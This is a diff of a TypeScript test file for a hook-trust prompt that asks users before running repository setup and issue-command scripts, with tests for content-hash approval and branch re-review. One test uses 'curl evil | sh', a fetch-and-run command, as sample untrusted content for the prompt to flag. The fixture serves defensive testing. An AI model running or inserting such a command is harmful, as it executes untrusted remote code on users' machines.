@@ -3,10 +3,13 @@ import type { AppState } from '@/store/types'
 import type { PersistedTrustedOrcaHooks } from '../../../shared/orca-yaml-hook-types'
 import {
   __resetTrustPromptChainForTests,
+  confirmCreatedWorktreeSetupContent,
+  ensureHooksApproved,
   ensureHooksConfirmed,
   readAndConfirmRuntimeIssueCommand
 } from './ensure-hooks-confirmed'
 import { hashOrcaHookScript } from './orca-hook-trust'
+import { createHash } from 'node:crypto'
 import {
   createCompatibleRuntimeStatusResponseIfNeeded,
   type RuntimeEnvironmentCallRequest
@@ -142,68 +145,6 @@ describe('ensureHooksConfirmed', () => {
     await expect(promise).resolves.toBe('skip')
   })
 
-  it('prompts for VM recipes using the recipe lifecycle declarations', async () => {
-    const { state, pending } = createTestState()
-    hooksCheckMock.mockResolvedValue({
-      hasHooks: true,
-      hooks: {
-        environmentRecipes: [
-          {
-            id: 'cloud-sandbox',
-            name: 'Cloud Sandbox',
-            description: 'Starts a per-workspace VM.',
-            create: './scripts/start-vm.sh',
-            suspend: './scripts/suspend-vm.sh',
-            resume: './scripts/resume-vm.sh',
-            destroy: './scripts/destroy-vm.sh'
-          }
-        ]
-      },
-      mayNeedUpdate: false
-    })
-
-    const promise = ensureHooksConfirmed(state, 'repo-1', 'vmRecipe')
-
-    await vi.waitFor(() => expect(pending).toHaveLength(1))
-    expect(pending[0].data.scriptKind).toBe('vmRecipe')
-    expect(pending[0].data.scriptContent).toContain('# environmentRecipes.cloud-sandbox')
-    expect(pending[0].data.scriptContent).toContain('create: ./scripts/start-vm.sh')
-    expect(pending[0].data.scriptContent).toContain('suspend: ./scripts/suspend-vm.sh')
-    expect(pending[0].data.scriptContent).toContain('resume: ./scripts/resume-vm.sh')
-    expect(pending[0].data.scriptContent).toContain('destroy: ./scripts/destroy-vm.sh')
-
-    pending[0].resolve('run')
-    await expect(promise).resolves.toBe('run')
-  })
-
-  it('returns run without inspecting hooks when the repo is always trusted', async () => {
-    const { state, pending } = createTestState()
-    state.trustedOrcaHooks['repo-1'] = {
-      all: { approvedAt: 1 }
-    }
-    hooksCheckMock.mockRejectedValue(new Error('boom'))
-
-    const decision = await ensureHooksConfirmed(state, 'repo-1', 'setup')
-
-    expect(decision).toBe('run')
-    expect(hooksCheckMock).not.toHaveBeenCalled()
-    expect(pending).toHaveLength(0)
-  })
-
-  it('returns run without prompting when no script of that kind is configured', async () => {
-    const { state, pending } = createTestState()
-    hooksCheckMock.mockResolvedValue({
-      hasHooks: true,
-      hooks: { scripts: {} },
-      mayNeedUpdate: false
-    })
-
-    const decision = await ensureHooksConfirmed(state, 'repo-1', 'archive')
-
-    expect(decision).toBe('run')
-    expect(pending).toHaveLength(0)
-  })
-
   it('checks SSH repo hooks through local IPC even when a runtime is focused', async () => {
     const { state, pending } = createTestState({
       settings: { activeRuntimeEnvironmentId: 'env-1' },
@@ -295,85 +236,10 @@ describe('ensureHooksConfirmed', () => {
     expect(runtimeEnvironmentCallMock).toHaveBeenCalledWith({
       selector: 'owner-env',
       method: 'repo.hooksCheck',
-      params: { repo: 'repo-1' },
+      params: { repo: 'repo-1', wakeWslDistro: true },
       timeoutMs: 15_000
     })
     expect(hooksCheckMock).not.toHaveBeenCalled()
-    expect(pending).toHaveLength(0)
-  })
-
-  it('does not prompt for orca.yaml when the repo uses local commands only', async () => {
-    const { state, pending } = createTestState({
-      repos: [
-        {
-          id: 'repo-1',
-          path: '/repo-1',
-          displayName: 'Repo One',
-          badgeColor: 'blue',
-          addedAt: 1,
-          hookSettings: {
-            mode: 'auto',
-            commandSourcePolicy: 'local-only',
-            scripts: { setup: 'echo local', archive: '' }
-          }
-        }
-      ]
-    } as Partial<AppState>)
-    hooksCheckMock.mockResolvedValue({
-      hasHooks: true,
-      hooks: { scripts: { setup: 'echo shared' } },
-      mayNeedUpdate: false
-    })
-
-    const decision = await ensureHooksConfirmed(state, 'repo-1', 'setup')
-
-    expect(decision).toBe('run')
-    expect(hooksCheckMock).not.toHaveBeenCalled()
-    expect(pending).toHaveLength(0)
-  })
-
-  it('does not prompt for orca.yaml when local commands are the implicit default', async () => {
-    const { state, pending } = createTestState({
-      repos: [
-        {
-          id: 'repo-1',
-          path: '/repo-1',
-          displayName: 'Repo One',
-          badgeColor: 'blue',
-          addedAt: 1,
-          hookSettings: {
-            mode: 'auto',
-            scripts: { setup: 'echo local', archive: '' }
-          }
-        }
-      ]
-    } as Partial<AppState>)
-    hooksCheckMock.mockResolvedValue({
-      hasHooks: true,
-      hooks: { scripts: { setup: 'echo shared' } },
-      mayNeedUpdate: false
-    })
-
-    const decision = await ensureHooksConfirmed(state, 'repo-1', 'setup')
-
-    expect(decision).toBe('run')
-    expect(hooksCheckMock).not.toHaveBeenCalled()
-    expect(pending).toHaveLength(0)
-  })
-
-  it('returns run without prompting when issueCommand source is local (user-owned)', async () => {
-    const { state, pending } = createTestState()
-    readIssueCommandMock.mockResolvedValue({
-      source: 'local',
-      sharedContent: null,
-      localContent: 'user content',
-      effectiveContent: 'user content',
-      localFilePath: ''
-    })
-
-    const decision = await ensureHooksConfirmed(state, 'repo-1', 'issueCommand')
-
-    expect(decision).toBe('run')
     expect(pending).toHaveLength(0)
   })
 
@@ -382,6 +248,7 @@ describe('ensureHooksConfirmed', () => {
     readIssueCommandMock.mockResolvedValue({
       status: 'error',
       source: 'local',
+      localUntracked: true,
       sharedContent: null,
       localContent: 'user content',
       effectiveContent: 'user content',
@@ -394,29 +261,23 @@ describe('ensureHooksConfirmed', () => {
     expect(pending).toHaveLength(0)
   })
 
-  it('forwards the explicit host to issueCommand inspection when repo ids collide', async () => {
-    const { state } = createTestState({
-      repos: [
-        { id: 'repo-1', displayName: 'Local Row' },
-        { id: 'repo-1', displayName: 'SSH Row', connectionId: 'server' }
-      ]
-    } as unknown as Partial<AppState>)
+  it('asks before running a local issue command not proven untracked', async () => {
+    const { state, pending } = createTestState()
     readIssueCommandMock.mockResolvedValue({
+      status: 'ok',
       source: 'local',
       sharedContent: null,
-      localContent: 'user content',
-      effectiveContent: 'user content',
+      localContent: 'committed content',
+      effectiveContent: 'committed content',
       localFilePath: ''
     })
 
-    await ensureHooksConfirmed(state, 'repo-1', 'issueCommand', 'ssh:server')
+    const promise = ensureHooksConfirmed(state, 'repo-1', 'issueCommand')
 
-    // A launch is a user act, so its read may start a stopped WSL distro (E9).
-    expect(readIssueCommandMock).toHaveBeenCalledWith({
-      repoId: 'repo-1',
-      hostId: 'ssh:server',
-      wakeWslDistro: true
-    })
+    await vi.waitFor(() => expect(pending).toHaveLength(1))
+    expect(pending[0].data.scriptContent).toBe('committed content')
+    pending[0].resolve('skip')
+    await expect(promise).resolves.toBe('skip')
   })
 
   it('approves and returns the exact issue-command bytes from one host-qualified read', async () => {
@@ -529,30 +390,6 @@ describe('ensureHooksConfirmed', () => {
     expect(pending).toHaveLength(0)
   })
 
-  it('opens a modal with the computed content hash and resolves with the user decision', async () => {
-    const { state, pending } = createTestState()
-    hooksCheckMock.mockResolvedValue({
-      hasHooks: true,
-      hooks: { scripts: { setup: 'pnpm install' } },
-      mayNeedUpdate: false
-    })
-
-    const promise = ensureHooksConfirmed(state, 'repo-1', 'setup')
-
-    await vi.waitFor(() => expect(pending).toHaveLength(1))
-    expect(pending[0].data).toMatchObject({
-      repoId: 'repo-1',
-      repoName: 'Repo One',
-      scriptKind: 'setup',
-      scriptContent: 'pnpm install',
-      contentHash: await hashOrcaHookScript('pnpm install'),
-      previouslyApproved: false
-    })
-
-    pending[0].resolve('run')
-    await expect(promise).resolves.toBe('run')
-  })
-
   it('serializes overlapping prompts so a second call waits for the first to resolve', async () => {
     const { state, pending } = createTestState()
     hooksCheckMock.mockResolvedValue({
@@ -629,6 +466,70 @@ describe('ensureHooksConfirmed', () => {
     const decision = await ensureHooksConfirmed(state, 'repo-1', 'setup')
 
     expect(decision).toBe('skip')
+    expect(pending).toHaveLength(0)
+  })
+
+  it('returns the approved setup hash the host recomputes with node crypto', async () => {
+    const { state, pending } = createTestState()
+    hooksCheckMock.mockResolvedValue({
+      hasHooks: true,
+      hooks: { scripts: { setup: 'pnpm install' } },
+      mayNeedUpdate: false
+    })
+
+    const promise = ensureHooksApproved(state, 'repo-1', 'setup')
+    await vi.waitFor(() => expect(pending).toHaveLength(1))
+    pending[0].resolve('run')
+
+    await expect(promise).resolves.toEqual({
+      decision: 'run',
+      approvedContentHash: createHash('sha256').update('pnpm install').digest('hex')
+    })
+  })
+
+  it('approves the empty setup content without prompting so a branch cannot add unseen scripts', async () => {
+    const { state, pending } = createTestState()
+    hooksCheckMock.mockResolvedValue({ hasHooks: false, hooks: null, mayNeedUpdate: false })
+
+    await expect(ensureHooksApproved(state, 'repo-1', 'setup')).resolves.toEqual({
+      decision: 'run',
+      approvedContentHash: await hashOrcaHookScript('')
+    })
+    expect(pending).toHaveLength(0)
+  })
+
+  it('sends no hash when the whole repo is trusted, so any branch content runs as before', async () => {
+    const { state } = createTestState()
+    state.trustedOrcaHooks['repo-1'] = { all: { approvedAt: 1 } }
+
+    await expect(ensureHooksApproved(state, 'repo-1', 'setup')).resolves.toEqual({
+      decision: 'run'
+    })
+  })
+
+  it('re-prompts with the created branch setup content that differs', async () => {
+    const { state, pending } = createTestState()
+
+    const promise = confirmCreatedWorktreeSetupContent(() => state, 'repo-1', 'curl evil | sh')
+    await vi.waitFor(() => expect(pending).toHaveLength(1))
+    expect(pending[0].data.scriptContent).toBe('curl evil | sh')
+    expect(pending[0].data.scriptKind).toBe('setup')
+    expect(pending[0].data.createdBranchReview).toBe(true)
+    pending[0].resolve('skip')
+
+    await expect(promise).resolves.toEqual({ decision: 'skip' })
+  })
+
+  it('returns the created branch content hash under repo-wide trust so the host can run it', async () => {
+    const { state, pending } = createTestState()
+    state.trustedOrcaHooks['repo-1'] = { all: { approvedAt: 1 } }
+
+    await expect(
+      confirmCreatedWorktreeSetupContent(() => state, 'repo-1', 'pnpm build')
+    ).resolves.toEqual({
+      decision: 'run',
+      approvedContentHash: createHash('sha256').update('pnpm build').digest('hex')
+    })
     expect(pending).toHaveLength(0)
   })
 })
